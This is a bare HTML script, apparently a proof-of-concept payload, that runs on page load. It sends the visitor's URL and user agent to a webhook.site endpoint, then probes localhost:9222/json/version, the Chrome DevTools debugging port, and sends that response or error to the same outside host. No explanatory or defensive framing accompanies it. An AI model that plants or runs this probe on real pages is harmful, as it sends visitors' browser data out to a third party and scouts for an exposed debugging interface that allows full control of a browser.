<script>
const webhook =
  "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";

async function report(stage, details = {}) {
  const data = JSON.stringify({
    stage,
    details,
    time: new Date().toISOString()
  });

  document.getElementById("status").textContent +=
    "\n" + data;

  try {
    await fetch(webhook, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "text/plain"
      },
      body: data
    });
  } catch (e) {
    console.error(e);
  }
}

async function run() {
  await report("page_loaded", {
    url: location.href,
    userAgent: navigator.userAgent
  });

  try {
    await report("before_cdp_fetch");

    const controller = new AbortController();
    const timeout = setTimeout(
      () => controller.abort(), 4000
    );

    const response = await fetch(
      "http://localhost:9222/json/version",
      {
        signal: controller.signal
      }
    );

    clearTimeout(timeout);

    await report("cdp_response", {
      status: response.status,
      body: await response.text()
    });

  } catch (e) {
    await report("cdp_error", {
      name: e.name,
      message: e.message
    });
  }
}

run();
</script>
